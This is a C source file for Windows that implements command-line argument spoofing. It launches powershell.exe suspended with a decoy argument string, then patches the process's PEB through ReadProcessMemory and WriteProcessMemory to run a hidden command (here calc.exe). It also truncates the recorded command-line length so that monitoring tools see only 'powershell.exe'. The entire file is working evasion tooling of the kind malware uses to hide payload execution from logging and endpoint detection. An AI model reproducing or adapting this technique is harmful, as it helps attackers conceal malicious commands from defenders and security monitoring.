#include<stdio.h>
#include<windows.h>
#include<winternl.h>

#define FAKE_ARGUMMENT L"powershell.exe I am a legit argument"
#define REAL_ARGUMMENT L"powershell.exe -NoExit -c calc.exe"

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
	);


BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, IN DWORD dwBufferSize, OUT PVOID* ppReadBuffer) {

	SIZE_T	sNmbrOfBytesRead = NULL;

	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);

	if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize) {
		printf("[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Read : %d Of %d \n", sNmbrOfBytesRead, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}


BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWrite, IN PVOID pBuffer, IN DWORD dwBufferSize) {

	SIZE_T sNumberOfSizeWriten = NULL;

	if (!WriteProcessMemory(hProcess, pAddressToWrite, pBuffer, dwBufferSize, &sNumberOfSizeWriten)) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Written : %d Of %d \n", sNumberOfSizeWriten, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}


BOOL CreateArgSpoofedProcess(IN  LPWSTR szStartingArg, IN LPWSTR szRealArg, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread){


	BOOL STATUS = TRUE;

	WCHAR szProcFakeArg [MAX_PATH];
	STARTUPINFOW Si = { 0 };
	PROCESS_INFORMATION Pi = { 0 };

	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	PROCESS_BASIC_INFORMATION PBI = { 0 };
	ULONG uReturnLlenght = NULL;

	PPEB pPEB = NULL;
	PRTL_USER_PROCESS_PARAMETERS pParams = NULL;

	Si.cb = sizeof(STARTUPINFOW);

	fnNtQueryInformationProcess pNtQueryInformationProc = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
	if (pNtQueryInformationProc == NULL) {
		return FALSE;
	}

	lstrcpyW(szProcFakeArg, szStartingArg);

	if (!CreateProcessW(
		NULL,
		szProcFakeArg,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		NULL,
		L"C:\\Windows\\System32\\",
		&Si,
		&Pi
	)) {
		printf("\t[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}


	STATUS = pNtQueryInformationProc(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uReturnLlenght);
	if (STATUS != 0 ) {
		printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
		return  FALSE;
	}

	
	if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, sizeof(PEB), &pPEB)) {
		printf("\t[!] Failed To Read Target's Process Peb \n");
		return FALSE;
	}
	
	
	if (!ReadFromTargetProcess(Pi.hProcess, pPEB->ProcessParameters, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF, &pParams)){
		printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
		return FALSE;
	}
	
	DWORD dwNewLen = sizeof(L"powershell.exe");

	if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPEB->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD))) {
		return FALSE;
	}

	if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParams->CommandLine.Buffer, (PVOID)szRealArg, (DWORD)(lstrlenW(szRealArg) * sizeof(WCHAR) +1 ))){
		printf("\t[!] Failed To Write The Real Parameters\n");
		return FALSE;
	}

	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pPEB);
	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pParams);

	ResumeThread(Pi.hThread);

	

	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	if (*dwProcessId != NULL, *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}


int main() {

	DWORD dwProcessId = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;

	wprintf(L"[i] Target Process  Will Be Created With [Startup Arguments] \"%s\" \n", FAKE_ARGUMMENT);
	wprintf(L"[i] The Actual Arguments [Payload Argument] \"%s\" \n", REAL_ARGUMMENT);

	if (!CreateArgSpoofedProcess(FAKE_ARGUMMENT, REAL_ARGUMMENT, &dwProcessId, &hProcess, &hThread)){
		return -1;
	}

	printf("\n[#] Press <Enter> To Quit ... ");
	getchar();
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}
